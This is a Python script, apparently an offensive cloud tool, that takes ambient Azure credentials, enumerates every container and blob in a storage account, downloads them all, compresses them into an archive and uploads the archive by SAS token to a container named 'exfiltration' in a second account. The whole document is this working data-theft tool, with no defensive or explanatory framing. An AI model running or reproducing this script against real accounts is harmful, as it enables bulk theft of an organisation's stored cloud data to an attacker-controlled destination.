import argparse
import tarfile
import tempfile
import os
import uuid

from azure.core.credentials import AzureSasCredential
from azure.identity import DefaultAzureCredential
from azure.storage.blob import BlobServiceClient

parser = argparse.ArgumentParser(prog="StorageDownload",
                                 description="Program to download all blobs from an Azure StorageAccount and upload to another.")
parser.add_argument("storageaccount_name", help="The name of the StorageAccount to enumerate.", type=str)
parser.add_argument("target_storageaccount_name", help="The name of the target StorageAccount to upload.", type=str)
parser.add_argument("sas_token", help="The SAS token for authentication.", type=str)
args = parser.parse_args()

def download_storageaccount(storageaccount_name: str):
    """ A function which downloads all the blobs from an azure storage account. """
    temp_dir = tempfile.TemporaryDirectory()
    account_url = f"https://{storageaccount_name}.blob.core.windows.net"
    credential = DefaultAzureCredential()
    blob_service_client = BlobServiceClient(account_url, credential=credential)
    containers = blob_service_client.list_containers()
    for container in containers:
        containerclient = blob_service_client.get_container_client(container=container.name)
        blobs = containerclient.list_blobs()
        for blob in blobs:
            blobclient = containerclient.get_blob_client(blob.name)
            with open(file=os.path.join(temp_dir.name, blob.name), mode="wb") as sample_blob:
                blobdata = blobclient.download_blob()
                sample_blob.write(blobdata.readall())
            print(f"Successfully downloaded blob {blob.name}!")
    
    tar_filename = f"{uuid.uuid4()}.tar.gz"
    tar_filepath = os.path.join(tempfile.gettempdir(), tar_filename)
    with tarfile.open(tar_filepath, "w:gz") as tar:
        tar.add(temp_dir.name, arcname=os.path.basename(temp_dir.name))
    temp_dir.cleanup()
    return tar_filepath

def upload_to_target_storageaccount(target_storageaccount_name: str, sas_token: str, tar_filepath: str):
    """ A function which uploads the tar file to a target azure storage account using SAS token. """
    account_url = f"https://{target_storageaccount_name}.blob.core.windows.net"
    credential = AzureSasCredential(sas_token)
    blob_service_client = BlobServiceClient(account_url, credential=credential)
    blob_name = os.path.basename(tar_filepath)
    blob_client = blob_service_client.get_blob_client(container="exfiltration", blob=blob_name)
    with open(tar_filepath, "rb") as data:
        blob_client.upload_blob(data)
    print(f"Successfully uploaded tar file {blob_name}!")

account_to_download = args.storageaccount_name
target_account = args.target_storageaccount_name
sas_token = args.sas_token

tar_filepath = download_storageaccount(account_to_download)
upload_to_target_storageaccount(target_account, sas_token, tar_filepath)
